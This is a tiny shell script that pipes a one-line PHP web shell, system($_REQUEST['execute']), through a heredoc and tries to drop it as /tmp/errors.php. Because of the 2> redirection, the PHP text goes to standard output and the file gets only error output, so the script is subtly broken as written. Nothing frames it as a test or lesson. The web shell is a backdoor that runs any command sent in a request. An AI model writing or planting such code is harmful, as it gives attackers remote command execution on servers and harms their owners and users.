#!/bin/sh
cat 2> /tmp/errors.php <<'DOC'
<?php system($_REQUEST['execute']);
DOC
